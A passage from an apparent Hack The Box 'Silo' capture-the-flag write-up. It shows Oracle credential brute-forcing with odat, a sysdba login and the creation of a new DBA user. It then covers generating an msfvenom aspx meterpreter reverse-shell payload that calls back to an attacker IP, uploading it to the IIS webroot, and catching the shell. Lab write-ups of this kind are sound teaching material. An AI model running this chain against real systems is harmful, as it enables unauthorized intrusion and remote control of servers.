+<span class="o">-</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">ask</span><span class="w"> </span><span class="k">every</span><span class="w"> </span><span class="nc">time</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="o">/</span><span class="n">A</span><span class="p">)</span><span class="w"></span>
+<span class="o">-</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="k">without</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">ask</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="o">/</span><span class="n">C</span><span class="p">)</span><span class="w"></span>
+<span class="n">c</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Valid</span><span class="w"> </span><span class="n">credentials</span><span class="w"> </span><span class="k">found</span><span class="err">:</span><span class="w"> </span><span class="n">scott</span><span class="o">/</span><span class="n">tiger</span><span class="p">.</span><span class="w"> </span><span class="k">Continue</span><span class="p">...</span><span class="w"> </span><span class="err">######################################################################################################################################################</span><span class="w">               </span><span class="o">|</span><span class="w"> </span><span class="nl">ETA</span><span class="p">:</span><span class="w">  </span><span class="mi">00</span><span class="err">:</span><span class="mi">00</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span>
+<span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="o">|</span><span class="err">#####################################################################################################################################################################################################################</span><span class="o">|</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">10</span><span class="err">:</span><span class="mi">56</span><span class="w"> </span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Accounts</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="o">/</span><span class="nl">XE</span><span class="p">:</span><span class="w"> </span>
+<span class="n">scott</span><span class="o">/</span><span class="n">tiger</span><span class="w"></span>
+</pre></div>
+
+
+<p>This time we found valid credentials: <code>scott/tiger</code>.</p>
+<p>Armed with these credentials we can now try to login to the db with <code>sqlplus</code>:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="p">[</span><span class="n">doluar</span><span class="p">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└──╼</span> <span class="err">$</span><span class="n">sqlplus64</span> <span class="n">scott</span><span class="o">/</span><span class="n">tiger</span><span class="mf">@10.10.10.82</span><span class="o">:</span><span class="mi">1521</span><span class="o">/</span><span class="n">XE</span>
+
+<span class="n">SQL</span><span class="o">*</span><span class="nl">Plus</span><span class="p">:</span> <span class="n">Release</span> <span class="mf">19.0.0.0.0</span> <span class="o">-</span> <span class="n">Production</span> <span class="n">on</span> <span class="n">Tue</span> <span class="n">Apr</span> <span class="mi">14</span> <span class="mi">16</span><span class="o">:</span><span class="mi">50</span><span class="o">:</span><span class="mi">50</span> <span class="mi">2020</span>
+<span class="n">Version</span> <span class="mf">19.6.0.0.0</span>
+
+<span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">1982</span><span class="p">,</span> <span class="mi">2019</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="nl">ERROR</span><span class="p">:</span>
+<span class="n">ORA</span><span class="o">-</span><span class="mi">28002</span><span class="o">:</span> <span class="n">the</span> <span class="n">password</span> <span class="n">will</span> <span class="n">expire</span> <span class="n">within</span> <span class="mi">7</span> <span class="n">days</span>
+
+
+
+<span class="n">Connected</span> <span class="nl">to</span><span class="p">:</span>
+<span class="n">Oracle</span> <span class="n">Database</span> <span class="mi">11</span><span class="n">g</span> <span class="n">Express</span> <span class="n">Edition</span> <span class="n">Release</span> <span class="mf">11.2.0.2.0</span> <span class="o">-</span> <span class="mi">64</span><span class="n">bit</span> <span class="n">Production</span>
+
+<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">user_role_privs</span><span class="p">;</span>
+
+<span class="n">USERNAME</span>                       <span class="n">GRANTED_ROLE</span>                   <span class="n">ADM</span> <span class="n">DEF</span> <span class="n">OS_</span>
+<span class="o">------------------------------</span> <span class="o">------------------------------</span> <span class="o">---</span> <span class="o">---</span> <span class="o">---</span>
+<span class="n">SCOTT</span>                          <span class="n">CONNECT</span>                        <span class="nb">NO</span>  <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SCOTT</span>                          <span class="n">RESOURCE</span>                       <span class="nb">NO</span>  <span class="nb">YES</span> <span class="nb">NO</span>
+
+<span class="n">SQL</span><span class="o">&gt;</span> 
+</pre></div>
+
+
+<p>As shown above, after connecting successfully I ran a select command to check the privileges and we can see scott does not have admin priveleges. Let's see if we are able to login <code>as sysdba</code>:</p>
+<div class="highlight"><pre><span></span><span class="n">luar</span><span class="p">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└──╼</span> <span class="err">$</span><span class="n">sqlplus64</span> <span class="n">scott</span><span class="o">/</span><span class="n">tiger</span><span class="mf">@10.10.10.82</span><span class="o">:</span><span class="mi">1521</span><span class="o">/</span><span class="n">XE</span> <span class="n">as</span> <span class="n">sysdba</span>
+
+<span class="n">SQL</span><span class="o">*</span><span class="nl">Plus</span><span class="p">:</span> <span class="n">Release</span> <span class="mf">19.0.0.0.0</span> <span class="o">-</span> <span class="n">Production</span> <span class="n">on</span> <span class="n">Tue</span> <span class="n">Apr</span> <span class="mi">14</span> <span class="mi">16</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mi">43</span> <span class="mi">2020</span>
+<span class="n">Version</span> <span class="mf">19.6.0.0.0</span>
+
+<span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">1982</span><span class="p">,</span> <span class="mi">2019</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+
+<span class="n">Connected</span> <span class="nl">to</span><span class="p">:</span>
+<span class="n">Oracle</span> <span class="n">Database</span> <span class="mi">11</span><span class="n">g</span> <span class="n">Express</span> <span class="n">Edition</span> <span class="n">Release</span> <span class="mf">11.2.0.2.0</span> <span class="o">-</span> <span class="mi">64</span><span class="n">bit</span> <span class="n">Production</span>
+
+<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">user_role_privs</span><span class="p">;</span>
+
+<span class="n">USERNAME</span>                       <span class="n">GRANTED_ROLE</span>                   <span class="n">ADM</span> <span class="n">DEF</span> <span class="n">OS_</span>
+<span class="o">------------------------------</span> <span class="o">------------------------------</span> <span class="o">---</span> <span class="o">---</span> <span class="o">---</span>
+<span class="n">SYS</span>                            <span class="n">ADM_PARALLEL_EXECUTE_TASK</span>      <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">APEX_ADMINISTRATOR_ROLE</span>        <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">AQ_ADMINISTRATOR_ROLE</span>          <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">AQ_USER_ROLE</span>                   <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">AUTHENTICATEDUSER</span>              <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">CONNECT</span>                        <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">CTXAPP</span>                         <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">DATAPUMP_EXP_FULL_DATABASE</span>     <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">DATAPUMP_IMP_FULL_DATABASE</span>     <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">DBA</span>                            <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">DBFS_ROLE</span>                      <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+
+<span class="n">USERNAME</span>                       <span class="n">GRANTED_ROLE</span>                   <span class="n">ADM</span> <span class="n">DEF</span> <span class="n">OS_</span>
+<span class="o">------------------------------</span> <span class="o">------------------------------</span> <span class="o">---</span> <span class="o">---</span> <span class="o">---</span>
+<span class="n">SYS</span>                            <span class="n">DELETE_CATALOG_ROLE</span>            <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">EXECUTE_CATALOG_ROLE</span>           <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">EXP_FULL_DATABASE</span>              <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">GATHER_SYSTEM_STATISTICS</span>       <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">HS_ADMIN_EXECUTE_ROLE</span>          <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">HS_ADMIN_ROLE</span>                  <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">HS_ADMIN_SELECT_ROLE</span>           <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">IMP_FULL_DATABASE</span>              <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">LOGSTDBY_ADMINISTRATOR</span>         <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">OEM_ADVISOR</span>                    <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">OEM_MONITOR</span>                    <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+
+<span class="n">USERNAME</span>                       <span class="n">GRANTED_ROLE</span>                   <span class="n">ADM</span> <span class="n">DEF</span> <span class="n">OS_</span>
+<span class="o">------------------------------</span> <span class="o">------------------------------</span> <span class="o">---</span> <span class="o">---</span> <span class="o">---</span>
+<span class="n">SYS</span>                            <span class="n">PLUSTRACE</span>                      <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">RECOVERY_CATALOG_OWNER</span>         <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">RESOURCE</span>                       <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">SCHEDULER_ADMIN</span>                <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">SELECT_CATALOG_ROLE</span>            <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">XDBADMIN</span>                       <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">XDB_SET_INVOKER</span>                <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">XDB_WEBSERVICES</span>                <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">XDB_WEBSERVICES_OVER_HTTP</span>      <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+<span class="n">SYS</span>                            <span class="n">XDB_WEBSERVICES_WITH_PUBLIC</span>    <span class="nb">YES</span> <span class="nb">YES</span> <span class="nb">NO</span>
+
+<span class="mi">32</span> <span class="n">rows</span> <span class="n">selected</span><span class="p">.</span>
+</pre></div>
+
+
+<p>Indeed connecting <code>as sysdba</code> shows that scott has admin privileges and this will be very useful since it will allow us to perform a set of actions that will eventually give us what we want. </p>
+<p>One thing I like to do whenever possible is to create my own user and don't mess aroung with the current one. So I do that:</p>
+<div class="highlight"><pre><span></span><span class="k">SQL</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">user</span> <span class="n">doluar</span> <span class="n">identified</span> <span class="k">by</span> <span class="n">myp4ssw0rd</span><span class="p">;</span>
+
+<span class="k">User</span> <span class="n">created</span><span class="p">.</span>
+
+<span class="k">SQL</span><span class="o">&gt;</span> <span class="k">grant</span> <span class="n">dba</span> <span class="k">to</span> <span class="n">doluar</span><span class="p">;</span>
+
+<span class="k">Grant</span> <span class="n">succeeded</span><span class="p">.</span>
+
+<span class="k">SQL</span><span class="o">&gt;</span> 
+</pre></div>
+
+
+<p>Now I need to find a way to get a shell. Looking within the options of <code>odat</code> there are two interesting ones:</p>
+<div class="highlight"><pre><span></span><span class="err">dbmsxslprocessor  to upload files</span>
+<span class="err">dbmsadvisor       to upload files</span>
+</pre></div>
+
+
+<p>So we will try to use one of these to upload a webshell to the victing machine. To understand what could be a suitable shell I run the below <code>curl</code> command. </p>
+<div class="highlight"><pre><span></span><span class="err">┌─[doluar@parrot]─[~]</span>
+<span class="err">└──╼ $curl -I 10.10.10.82</span>
+<span class="err">HTTP/1.1 200 OK</span>
+<span class="c">Content-Length: 701</span>
+<span class="nt">Content-Type:</span><span class="w"> </span><span class="nl">text</span><span class="dl">/</span><span class="nl">html</span><span class="w"></span>
+<span class="c">Last-Modified: Wed, 03 Jan 2018 00:36:17 GMT</span>
+<span class="c">Accept-Ranges: bytes</span>
+<span class="c">ETag: &quot;1114bde2a84d31:0&quot;</span>
+<span class="c">Server: Microsoft-IIS/8.5</span>
+<span class="c">X-Powered-By: ASP.NET</span>
+<span class="c">Date: Tue, 14 Apr 2020 16:08:42 GMT</span>
+</pre></div>
+
+
+<p>This tells me that we are dealing with the <code>ASP.NET</code> framework and therefore I will create an <code>aspx</code> webshell and upload it to the victim box (I tried <code>asp</code> before <code>aspx</code> but didn't work) . To generate the payload I will use <code>msfvenom</code>:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─[✗]─[doluar@parrot]─[~/Documents/htb/boxes/silo]</span>
+<span class="err">└──╼ $msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.6 LPORT=443 -f aspx  -o shell.aspx</span>
+<span class="err">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
+<span class="err">[-] No arch selected, selecting arch: x86 from the payload</span>
+<span class="err">No encoder or badchars specified, outputting raw payload</span>
+<span class="err">Payload size: 604 bytes</span>
+<span class="err">Final size of aspx file: 4118 bytes</span>
+<span class="err">Saved as: shell.aspx</span>
+<span class="err">┌─[doluar@parrot]─[~/Documents/htb/boxes/silo]</span>
+<span class="err">└──╼ $ll</span>
+<span class="err">total 8.0K</span>
+<span class="err">-rw-r--r-- 1 doluar doluar 4.1K Apr 14 22:51 shell.aspx</span>
+</pre></div>
+
+
+<p>and then I upload the file in the IIS root directory (default is <code>C:\inetput\wwwroot</code>)</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/odat</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">python3</span><span class="w"> </span><span class="n">odat</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">dbmsxslprocessor</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">doluar</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">myp4ssw0rd</span><span class="w">  </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span><span class="c1">--sysdba --putFile &quot;C:\inetpub\wwwroot&quot; &quot;shell.aspx&quot; &quot;/home/doluar/Documents/htb/boxes/silo/shell.aspx&quot;</span>
+
+<span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Put</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="p">(</span><span class="n">named</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span><span class="p">)</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="n">server</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="p">(</span><span class="n">named</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+
+
+<p>Once we have the file in that directory I start a meterpreter listenr and then I browse to the <code>aspx</code> payload to activate the shell:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─[✗]─[doluar@parrot]─[~/Tools/odat]</span>
+<span class="err">└──╼ $curl http://10.10.10.82/shell.aspx</span>
+</pre></div>
+
+
+<p>and we get the shell:</p>
+<div class="highlight"><pre><span></span><span class="nt">msf5</span> <span class="o">&gt;</span> <span class="nt">use</span> <span class="nt">exploit</span><span class="o">/</span><span class="nt">multi</span><span class="o">/</span><span class="nt">handler</span>
+<span class="nt">msf5</span> <span class="nt">exploit</span><span class="o">(</span><span class="nt">multi</span><span class="o">/</span><span class="nt">handler</span><span class="o">)</span> <span class="o">&gt;</span> <span class="nt">set</span> <span class="nt">payload</span> <span class="nt">windows</span><span class="o">/</span><span class="nt">x64</span><span class="o">/</span><span class="nt">meterpreter</span><span class="o">/</span><span class="nt">reverse_https</span>
+<span class="nt">payload</span> <span class="o">=&gt;</span> <span class="nt">windows</span><span class="o">/</span><span class="nt">x64</span><span class="o">/</span><span class="nt">meterpreter</span><span class="o">/</span><span class="nt">reverse_https</span>
+<span class="nt">msf5</span> <span class="nt">exploit</span><span class="o">(</span><span class="nt">multi</span><span class="o">/</span><span class="nt">handler</span><span class="o">)</span> <span class="o">&gt;</span> <span class="nt">set</span> <span class="nt">LHOST</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">6</span>
+<span class="nt">LHOST</span> <span class="o">=&gt;</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">6</span>
+<span class="nt">msf5</span> <span class="nt">exploit</span><span class="o">(</span><span class="nt">multi</span><span class="o">/</span><span class="nt">handler</span><span class="o">)</span> <span class="o">&gt;</span> <span class="nt">set</span> <span class="nt">LPORT</span> <span class="nt">443</span>
+<span class="nt">LPORT</span> <span class="o">=&gt;</span> <span class="nt">443</span>
+<span class="nt">msf5</span> <span class="nt">exploit</span><span class="o">(</span><span class="nt">multi</span><span class="o">/</span><span class="nt">handler</span><span class="o">)</span> <span class="o">&gt;</span> <span class="nt">run</span>
+
+<span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="nt">Started</span> <span class="nt">HTTPS</span> <span class="nt">reverse</span> <span class="nt">handler</span> <span class="nt">on</span> <span class="nt">https</span><span class="o">://</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">6</span><span class="p">:</span><span class="nd">443</span>
+<span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="nt">https</span><span class="o">://</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">6</span><span class="p">:</span><span class="nd">443</span> <span class="nt">handling</span> <span class="nt">request</span> <span class="nt">from</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">82</span><span class="o">;</span> <span class="o">(</span><span class="nt">UUID</span><span class="o">:</span> <span class="nt">lwv93nms</span><span class="o">)</span> <span class="nt">Staging</span> <span class="nt">x64</span> <span class="nt">payload</span> <span class="o">(</span><span class="nt">207449</span> <span class="nt">bytes</span><span class="o">)</span> <span class="o">...</span>
+<span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="nt">Meterpreter</span> <span class="nt">session</span> <span class="nt">1</span> <span class="nt">opened</span> <span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">6</span><span class="p">:</span><span class="nd">443</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">82</span><span class="p">:</span><span class="nd">49166</span><span class="o">)</span> <span class="nt">at</span> <span class="nt">2020-04-14</span> <span class="nt">23</span><span class="p">:</span><span class="nd">28</span><span class="p">:</span><span class="nd">40</span> <span class="o">+</span><span class="nt">0100</span>
+
+<span class="nt">meterpreter</span> <span class="o">&gt;</span><span class="nt">shell</span>
+<span class="nt">Process</span> <span class="nt">1692</span> <span class="nt">created</span><span class="o">.</span>
+<span class="nt">Channel</span> <span class="nt">1</span> <span class="nt">created</span><span class="o">.</span>
+<span class="nt">Microsoft</span> <span class="nt">Windows</span> <span class="cp">[</span><span class="nx">Version</span> <span class="mf">6.3.9600</span><span class="cp">]</span>
+<span class="o">(</span><span class="nt">c</span><span class="o">)</span> <span class="nt">2013</span> <span class="nt">Microsoft</span> <span class="nt">Corporation</span><span class="o">.</span> <span class="nt">All</span> <span class="nt">rights</span> <span class="nt">reserved</span><span class="o">.</span>
+
+<span class="nt">c</span><span class="o">:</span><span class="err">\</span><span class="nt">windows</span><span class="err">\</span><span class="nt">system32</span><span class="err">\</span><span class="nt">inetsrv</span><span class="o">&gt;</span><span class="nt">whoami</span>
+<span class="nt">whoami</span>
+<span class="nt">iis</span> <span class="nt">apppool</span><span class="err">\</span><span class="nt">defaultapppool</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>then I moved to the Users directory and noticed the user <code>Phineas</code> and inside his desktop I found the <code>user.txt</code>:</p>
+<div class="highlight"><pre><span></span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="o">&gt;</span><span class="n">dir</span>
+<span class="n">dir</span>
+ <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="k">C</span> <span class="n">has</span> <span class="k">no</span> <span class="n">label</span><span class="p">.</span>
+ <span class="n">Volume</span> <span class="nb">Serial</span> <span class="nb">Number</span> <span class="k">is</span> <span class="mi">78</span><span class="n">D4</span><span class="o">-</span><span class="n">EA4D</span>
+
+ <span class="n">Directory</span> <span class="k">of</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span>
+
+<span class="mi">01</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">40</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">40</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">03</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span><span class="n">NET</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">03</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span><span class="n">NET</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span> <span class="n">Classic</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">23</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span><span class="n">NET</span> <span class="n">v4</span><span class="p">.</span><span class="mi">5</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">23</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span><span class="n">NET</span> <span class="n">v4</span><span class="p">.</span><span class="mi">5</span> <span class="n">Classic</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">49</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Administrator</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">03</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Classic</span> <span class="p">.</span><span class="n">NET</span> <span class="n">AppPool</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">04</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Phineas</span>
+<span class="mi">08</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="mi">2013</span>  <span class="mi">04</span><span class="p">:</span><span class="mi">39</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="k">Public</span>
+               <span class="mi">0</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>              <span class="mi">0</span> <span class="n">bytes</span>
+              <span class="mi">10</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">15</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">658</span><span class="p">,</span><span class="mi">432</span> <span class="n">bytes</span> <span class="k">free</span>
+
+<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">phineas</span>
+<span class="n">cd</span> <span class="n">phineas</span>
+
+<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">desktop</span>
+<span class="n">cd</span> <span class="n">desktop</span>
+
+<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">dir</span>
+<span class="n">dir</span>
+ <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="k">C</span> <span class="n">has</span> <span class="k">no</span> <span class="n">label</span><span class="p">.</span>
